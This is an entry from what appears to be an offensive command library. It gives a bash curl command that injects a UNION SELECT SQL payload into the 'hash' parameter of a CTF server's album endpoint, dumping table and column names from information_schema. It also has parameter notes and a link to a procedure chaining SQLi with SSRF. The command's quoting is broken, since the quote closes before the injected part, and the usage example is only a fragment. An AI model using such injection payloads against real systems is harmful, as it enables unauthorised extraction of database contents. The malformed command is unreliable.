---
id: cmd-uuid-14
data: >-
  curl -s
  'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd' UNION
  SELECT 1,2,group_concat(concat(table_name,':',column_name)) from
  information_schema.columns WHERE table_schema='recon';/*'
tags:
  - sqli
type: command
output: DB structure.
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:48.610Z'
verified: false
validated: true
submitted: true
---
# Curl Sqli Schema Dump

## Command

```bash
curl -s 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd' UNION SELECT 1,2,group_concat(concat(table_name,':',column_name)) from information_schema.columns WHERE table_schema='recon';/*'
```

## Description

Dumps DB schema via SQLi UNION.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| hash | SQLi payload | Yes |

## Examples

### Basic Usage

```bash
curl '?hash=UNION ...'
```

## Expected Output

Table:column list.

## Related

- [[procedures/Chain-SQLi-and-SSRF-for-Internal-API-Brute-Forcing]]
